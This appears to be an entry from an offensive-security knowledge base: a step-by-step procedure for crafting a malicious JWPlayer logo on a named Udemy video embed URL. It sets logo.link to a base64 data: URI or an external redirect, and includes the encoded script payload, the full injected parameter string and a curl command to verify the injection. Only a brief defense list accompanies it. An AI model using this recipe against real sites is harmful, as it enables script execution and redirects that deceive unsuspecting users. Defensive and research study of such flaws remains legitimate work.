---
id: proc-craft-jwplayer-params
tags:
  - xss
  - payload-craft
  - jwplayer
type: procedure
tools:
  - '[[tools/JWPlayer-Configuration-Manual]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-test-embed-url]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:31.621Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-JWPlayer-Logo-Parameters

## Summary

This procedure crafts a modified Udemy video embed URL by appending JWPlayer configuration parameters to create a malicious clickable logo, enabling reflected XSS via data: URIs or open redirects upon user click.

## Description

Building on request analysis, attackers reference JWPlayer 6 documentation to set options like logo.file and logo.link. By encoding JavaScript in base64 within a data: URI for logo.link, or using protocol-relative URLs for redirects, the player displays a disguised image (e.g., play button) that covers the video. Clicking it loads the payload in about:blank, executing JS or redirecting. This targets web environments, with high impact on unsuspecting users.

## Requirements

1. Knowledge of JWPlayer 6 options from official manual
2. Base64 encoder for JS payloads (built-in browser tools suffice)
3. Valid Udemy embed URL from prior reconnaissance

## Defense

Defensive measures and detection strategies:

- Sanitize all params[vars] inputs server-side, whitelisting only expected JWPlayer keys
- Block data: and javascript: schemes in URL parameters
- Monitor for anomalous embed requests with logo.link variations

## Objectives

1. Inject malicious logo configuration into embed URL
2. Ensure payload evasion of basic validation
3. Test for successful player reconfiguration

## Instructions

### Step 1: Reference JWPlayer Options

**Context**: Consult documentation for configurable elements like logo.

Visit http://support.jwplayer.com/customer/portal/articles/1413113-configuration-options-reference and note options such as abouttext, controls, logo.file, and logo.link.

> Identify that logo.link accepts arbitrary URLs, including data: URIs.

### Step 2: Encode Payload

**Context**: Prepare XSS or redirect payload in base64.

Encode <script>alert("Hello");</script> as data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4= using a browser console or online tool.

> For redirect, use //google.com.ua or full external URL.

### Step 3: Append Parameters to URL

**Context**: Modify the base embed URL with malicious params.

Start with https://www.udemy.com/embed/video/E0IfdVtaQngT/ and append ?params[vars][abouttext]=Play&params[vars][controls]=false&params[vars][width]=750&params[vars][height]=422&params[vars][logo][file]=https://dujk9xa5fr1wz.cloudfront.net/course/750x422/211248_71a0_4.jpg&params[vars][logo][link]=[encoded-payload].

> Test with [[commands/curl-test-embed-url]]:

Execute [[commands/curl-test-embed-url]] to verify:

```bash
curl -s "https://www.udemy.com/embed/video/E0IfdVtaQngT/?params[vars][logo][link]=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=" | grep -i logo
```

> Output should show the injected logo.link in the response HTML/JS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-embed-url]]

## Tools Used

- [[tools/JWPlayer-Configuration-Manual]]

## Tags

- xss
- payload-craft
- jwplayer
